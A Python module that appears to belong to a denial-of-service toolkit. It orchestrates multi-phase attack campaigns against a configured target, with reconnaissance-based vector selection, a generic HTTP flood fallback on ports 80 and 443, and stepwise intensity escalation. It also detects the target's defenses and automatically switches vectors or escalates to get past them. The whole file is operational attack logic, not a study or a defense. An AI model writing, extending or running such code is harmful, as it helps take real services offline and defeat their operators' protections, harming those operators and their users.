"""
Intelligent Attack Vector Selector with Automatic Adaptation

Combines reconnaissance, vector selection, effectiveness monitoring, and automatic adaptation
to create an intelligent attack orchestration system.

Requirements:
- 21.4: Switch vectors on defense detection
- 21.5: Escalate attack intensity, multi-phase campaign support
"""

import asyncio
import time
import logging
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Callable
from enum import Enum

from .vector_selector import ServiceVectorMapper, VectorRecommendation, VectorType
from .effectiveness_monitor import EffectivenessMonitor, DefenseState, EffectivenessStats

logger = logging.getLogger(__name__)


class CampaignPhase(Enum):
    """Multi-phase campaign phases"""
    RECONNAISSANCE = "reconnaissance"
    INITIAL_PROBE = "initial_probe"
    ESCALATION = "escalation"
    SUSTAINED_ATTACK = "sustained_attack"
    ADAPTATION = "adaptation"
    COOLDOWN = "cooldown"


class IntensityLevel(Enum):
    """Attack intensity levels"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    MAXIMUM = "maximum"


@dataclass
class CampaignConfig:
    """
    Multi-phase campaign configuration.
    
    Requirements: 21.5 - Multi-phase campaign support
    """
    target: str
    initial_intensity: IntensityLevel = IntensityLevel.LOW
    max_intensity: IntensityLevel = IntensityLevel.HIGH
    auto_escalate: bool = True
    auto_adapt: bool = True
    adaptation_threshold: float = 0.5  # Effectiveness threshold for adaptation
    defense_detection_action: str = "switch"  # switch, escalate, or stop
    phases: List[CampaignPhase] = field(default_factory=lambda: [
        CampaignPhase.RECONNAISSANCE,
        CampaignPhase.INITIAL_PROBE,
        CampaignPhase.ESCALATION,
        CampaignPhase.SUSTAINED_ATTACK,
    ])
    phase_durations: Dict[CampaignPhase, float] = field(default_factory=lambda: {
        CampaignPhase.RECONNAISSANCE: 30.0,
        CampaignPhase.INITIAL_PROBE: 60.0,
        CampaignPhase.ESCALATION: 120.0,
        CampaignPhase.SUSTAINED_ATTACK: 300.0,
        CampaignPhase.ADAPTATION: 60.0,
        CampaignPhase.COOLDOWN: 30.0,
    })


@dataclass
class AdaptationEvent:
    """Record of an adaptation event"""
    timestamp: float
    reason: str
    old_vector: Optional[VectorType]
    new_vector: VectorType
    old_intensity: IntensityLevel
    new_intensity: IntensityLevel
    effectiveness_before: float
    effectiveness_after: Optional[float] = None


class IntelligentVectorSelector:
    """
    Intelligent attack vector selector with automatic adaptation.
    
    Combines:
    - Service-to-vector mapping
    - Effectiveness monitoring
    - Automatic vector switching
    - Intensity escalation
    - Multi-phase campaigns
    
    Requirements:
    - 21.4: Switch vectors on defense detection
    - 21.5: Escalate attack intensity, multi-phase campaign support
    """
    
    # Intensity to rate multiplier mapping
    INTENSITY_MULTIPLIERS = {
        IntensityLevel.LOW: 0.25,
        IntensityLevel.MEDIUM: 0.5,
        IntensityLevel.HIGH: 1.0,
        IntensityLevel.MAXIMUM: 2.0,
    }
    
    def __init__(self, config: CampaignConfig):
        """
        Initialize intelligent selector.
        
        Args:
            config: Campaign configuration
        """
        self.config = config
        
        # Components
        self.vector_mapper = ServiceVectorMapper()
        self.effectiveness_monitor = EffectivenessMonitor()
        
        # State
        self.current_phase = CampaignPhase.RECONNAISSANCE
        self.current_vector: Optional[VectorType] = None
        self.current_intensity = config.initial_intensity
        self.available_vectors: List[VectorRecommendation] = []
        self.tried_vectors: List[VectorType] = []
        self.adaptation_history: List[AdaptationEvent] = []
        
        # Callbacks
        self.on_vector_change: Optional[Callable] = None
        self.on_intensity_change: Optional[Callable] = None
        self.on_phase_change: Optional[Callable] = None
        
        # Control
        self._running = False
        self._phase_start_time: Optional[float] = None
        
    async def initialize(self, target_profile: Dict[str, Any]):
        """
        Initialize selector with target profile.
        
        Args:
            target_profile: Target profile from reconnaissance
        """
        logger.info(f"Initializing intelligent selector for {self.config.target}")
        
        # Select vectors based on profile
        self.available_vectors = self.vector_mapper.select_vectors_from_profile(target_profile)
        
        if not self.available_vectors:
            logger.warning("No attack vectors identified from target profile")
            # Add generic fallback
            from .vector_selector import VectorRecommendation
            self.available_vectors = [
                VectorRecommendation(
                    vector=VectorType.HTTP_FLOOD,
                    effectiveness=0.5,
                    description="Generic HTTP flood",
                    target_ports=[80, 443],
                )
            ]
        
        logger.info(f"Identified {len(self.available_vectors)} potential attack vectors")
        
        # Select initial vector
        self.current_vector = self.available_vectors[0].vector
        self.tried_vectors.append(self.current_vector)
        
        logger.info(f"Initial vector: {self.current_vector.value}")
        logger.info(f"Initial intensity: {self.current_intensity.value}")
    
    async def start_campaign(self):
        """
        Start multi-phase attack campaign.
        
        Requirements: 21.5 - Multi-phase campaign support
        """
        self._running = True
        
        logger.info("Starting multi-phase attack campaign")
        
        for phase in self.config.phases:
            if not self._running:
                break
            
            await self._execute_phase(phase)
        
        logger.info("Campaign completed")
    
    async def _execute_phase(self, phase: CampaignPhase):
        """
        Execute a campaign phase.
        
        Requirements: 21.5 - Multi-phase campaign support
        """
        self.current_phase = phase
        self._phase_start_time = time.time()
        duration = self.config.phase_durations.get(phase, 60.0)
        
        logger.info(f"Entering phase: {phase.value} (duration: {duration}s)")
        
        if self.on_phase_change:
            await self.on_phase_change(phase)
        
        if phase == CampaignPhase.RECONNAISSANCE:
            # Already done during initialization
            await asyncio.sleep(duration)
            
        elif phase == CampaignPhase.INITIAL_PROBE:
            # Start with low intensity
            await self._set_intensity(IntensityLevel.LOW)
            await self._monitor_phase(duration)
            
        elif phase == CampaignPhase.ESCALATION:
            # Gradually escalate intensity
            await self._escalate_intensity(duration)
            
        elif phase == CampaignPhase.SUSTAINED_ATTACK:
            # Maintain attack with adaptation
            await self._sustained_attack(duration)
            
        elif phase == CampaignPhase.ADAPTATION:
            # Adapt based on effectiveness
            await self._adapt_strategy()
            await self._monitor_phase(duration)
            
        elif phase == CampaignPhase.COOLDOWN:
            # Reduce intensity
            await self._set_intensity(IntensityLevel.LOW)
            await asyncio.sleep(duration)
    
    async def _monitor_phase(self, duration: float):
        """Monitor phase with periodic adaptation checks"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self._running:
            await asyncio.sleep(5.0)  # Check every 5 seconds
            
            if self.config.auto_adapt and self.effectiveness_monitor.should_adapt():
                logger.info("Adaptation triggered during phase monitoring")
                await self._adapt_strategy()
    
    async def _escalate_intensity(self, duration: float):
        """
        Gradually escalate attack intensity.
        
        Requirements: 21.5 - Escalate attack intensity
        """
        intensities = [
            IntensityLevel.LOW,
            IntensityLevel.MEDIUM,
            IntensityLevel.HIGH,
        ]
        
        if self.config.max_intensity == IntensityLevel.MAXIMUM:
            intensities.append(IntensityLevel.MAXIMUM)
        
        step_duration = duration / len(intensities)
        
        for intensity in intensities:
            if not self._running:
                break
            
            if intensity.value == self.config.max_intensity.value:
                break
            
            await self._set_intensity(intensity)
            await self._monitor_phase(step_duration)
    
    async def _sustained_attack(self, duration: float):
        """
        Sustained attack with continuous adaptation.
        
        Requirements: 21.4 - Switch vectors on defense detection
        """
        end_time = time.time() + duration
        
        while time.time() < end_time and self._running:
            await asyncio.sleep(10.0)  # Check every 10 seconds
            
            # Check for defense activation
            if self.effectiveness_monitor.is_defense_active():
                logger.warning(f"Defense detected: {self.effectiveness_monitor.get_defense_state().value}")
                
                if self.config.defense_detection_action == "switch":
                    await self._switch_vector("Defense detected")
                elif self.config.defense_detection_action == "escalate":
                    await self._escalate_one_level()
                elif self.config.defense_detection_action == "stop":
                    logger.info("Stopping attack due to defense detection")
                    self._running = False
                    break
            
            # Check effectiveness
            elif self.config.auto_adapt and self.effectiveness_monitor.should_adapt():
                reason = self.effectiveness_monitor.get_adaptation_reason()
                logger.info(f"Adapting strategy: {reason}")
                await self._adapt_strategy()
    
    async def _adapt_strategy(self):
        """
        Adapt attack strategy based on effectiveness.
        
        Requirements: 21.4 - Switch vectors on defense detection
        """
        stats = self.effectiveness_monitor.get_stats()
        
        # If defense detected, switch vector
        if stats.defense_state != DefenseState.NONE:
            await self._switch_vector(f"Defense: {stats.defense_state.value}")
            return
        
        # If effectiveness is low, try different vector
        if stats.effectiveness_score < self.config.adaptation_threshold:
            await self._switch_vector(f"Low effectiveness: {stats.effectiveness_score:.2f}")
            return
        
        # If success rate is degrading, escalate intensity
        if stats.success_rate_trend == "degrading":
            await self._escalate_one_level()
            return
    
    async def _switch_vector(self, reason: str):
        """
        Switch to a different attack vector.
        
        Requirements: 21.4 - Switch vectors on defense detection
        """
        old_vector = self.current_vector
        old_effectiveness = self.effectiveness_monitor.get_stats().effectiveness_score
        
        # Find next untried vector
        untried_vectors = [v for v in self.available_vectors 
                          if v.vector not in self.tried_vectors]
        
        if not untried_vectors:
            logger.warning("All vectors have been tried, cycling back")
            self.tried_vectors.clear()
            untried_vectors = self.available_vectors
        
        # Select next vector
        next_vector_rec = untried_vectors[0]
        self.current_vector = next_vector_rec.vector
        self.tried_vectors.append(self.current_vector)
        
        logger.info(f"Switching vector: {old_vector.value if old_vector else 'None'} → "
                   f"{self.current_vector.value} (reason: {reason})")
        
        # Record adaptation
        event = AdaptationEvent(
            timestamp=time.time(),
            reason=reason,
            old_vector=old_vector,
            new_vector=self.current_vector,
            old_intensity=self.current_intensity,
            new_intensity=self.current_intensity,
            effectiveness_before=old_effectiveness,
        )
        self.adaptation_history.append(event)
        
        # Reset effectiveness monitor for new vector
        self.effectiveness_monitor.reset()
        
        # Notify callback
        if self.on_vector_change:
            await self.on_vector_change(self.current_vector, next_vector_rec)
    
    async def _escalate_one_level(self):
        """
        Escalate intensity by one level.
        
        Requirements: 21.5 - Escalate attack intensity
        """
        intensity_order = [
            IntensityLevel.LOW,
            IntensityLevel.MEDIUM,
            IntensityLevel.HIGH,
            IntensityLevel.MAXIMUM,
        ]
        
        current_idx = intensity_order.index(self.current_intensity)
        if current_idx < len(intensity_order) - 1:
            new_intensity = intensity_order[current_idx + 1]
            
            # Check max intensity limit
            max_idx = intensity_order.index(self.config.max_intensity)
            if current_idx + 1 <= max_idx:
                await self._set_intensity(new_intensity)
            else:
                logger.info(f"Already at maximum allowed intensity: {self.config.max_intensity.value}")
        else:
            logger.info("Already at maximum intensity")
    
    async def _set_intensity(self, intensity: IntensityLevel):
        """
        Set attack intensity.
        
        Requirements: 21.5 - Escalate attack intensity
        """
        old_intensity = self.current_intensity
        self.current_intensity = intensity
        
        logger.info(f"Intensity: {old_intensity.value} → {intensity.value}")
        
        # Notify callback
        if self.on_intensity_change:
            multiplier = self.INTENSITY_MULTIPLIERS[intensity]
            await self.on_intensity_change(intensity, multiplier)
    
    def record_response(self, response_time: float, status_code: int,
                       error: bool = False, bytes_received: int = 0,
                       response_body: Optional[str] = None):
        """
        Record a response for effectiveness monitoring.
        
        Args:
            response_time: Response time in seconds
            status_code: HTTP status code
            error: Whether this was an error
            bytes_received: Bytes received
            response_body: Optional response body
        """
        self.effectiveness_monitor.record_response(
            response_time, status_code, error, bytes_received, response_body
        )
    
    def get_current_vector(self) -> Optional[VectorType]:
        """Get current attack vector"""
        return self.current_vector
    
    def get_current_intensity(self) -> IntensityLevel:
        """Get current intensity level"""
        return self.current_intensity
    
    def get_intensity_multiplier(self) -> float:
        """Get current intensity multiplier"""
        return self.INTENSITY_MULTIPLIERS[self.current_intensity]
    
    def get_effectiveness_stats(self) -> EffectivenessStats:
        """Get current effectiveness statistics"""
        return self.effectiveness_monitor.get_stats()
    
    def get_adaptation_history(self) -> List[AdaptationEvent]:
        """Get history of adaptation events"""
        return self.adaptation_history
    
    def is_defense_active(self) -> bool:
        """Check if defense is currently active"""
        return self.effectiveness_monitor.is_defense_active()
    
    def stop(self):
        """Stop the campaign"""
        self._running = False
        logger.info("Campaign stopped")
    
    def get_campaign_summary(self) -> Dict[str, Any]:
        """Get summary of campaign"""
        stats = self.effectiveness_monitor.get_stats()
        
        return {
            'target': self.config.target,
            'current_phase': self.current_phase.value,
            'current_vector': self.current_vector.value if self.current_vector else None,
            'current_intensity': self.current_intensity.value,
            'vectors_tried': [v.value for v in self.tried_vectors],
            'adaptations': len(self.adaptation_history),
            'effectiveness': stats.effectiveness_score,
            'success_rate': stats.success_rate,
            'defense_detected': stats.defense_state.value,
            'total_requests': stats.total_requests,
        }
